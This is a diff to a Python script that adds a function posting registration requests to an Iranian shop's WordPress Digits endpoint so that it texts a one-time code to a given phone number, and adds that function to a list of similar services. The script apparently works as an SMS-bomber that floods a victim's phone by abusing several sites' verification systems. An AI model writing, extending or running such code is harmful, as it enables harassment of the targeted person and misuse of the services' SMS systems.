@@ -48,6 +48,84 @@ def check_internet():
 # ------------------------------
 
 
+def katoonistore(phone):
+    import requests
+    import re
+    
+    digits_phone = phone.replace("+98", "")
+    
+    try:
+        session = requests.Session()
+        home_response = session.get("https://katoonistore.ir/", timeout=10)
+        
+        # استخراج instance_id از صفحه
+        instance_id = None
+        instance_patterns = [
+            r'name="instance_id" value="([a-f0-9]+)"',
+            r'instance_id["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
+        ]
+        
+        for pattern in instance_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                instance_id = match.group(1)
+                break
+        
+        if not instance_id:
+            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"  # مقدار پیشفرض
+        
+        url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
+        
+        payload = {
+            "digits_reg_name": "م",  # نام تصادفی
+            "digt_countrycode": "+98",
+            "phone": digits_phone,
+            "digits_reg_تاریخ1747725841572": "",  # فیلدهای اضافی
+            "jalali_digits_reg_تاریخ1747725841572463063470": "",
+            "digits_process_register": "1",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
+            "instance_id": instance_id,
+            "optional_data": "optional_data",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "dig_otp": "sms_otp",
+            "digits": "1",
+            "digits_redirect_page": "//katoonistore.ir/?page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
+            "digits_form": "d3232db853",  # ممکنه نیاز به استخراج داشته باشه
+            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
+            "otp_resend": "true",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://katoonistore.ir",
+            "Referer": "https://katoonistore.ir/",
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            response_data = response.json()
+            if response_data.get("success") is True:
+                print(f'{g}(katoonistore) {a}Code Sent')
+                return True
+        
+        print(f'{r}[-] (katoonistore) Failed{a}')
+        return False
+            
+    except Exception:
+        print(f'{r}[-] (katoonistore) Failed{a}')
+        return False
+
+
+
+
 def hajamooo(phone):
     import requests
     import re
@@ -148,6 +226,7 @@ def Vip(phone, Time):
     services = [
         digikala,
         hajamooo,
+        katoonistore,
         # سرویس‌های دیگه بعداً اینجا اضافه میشن
     ]
     total_services = len(services)
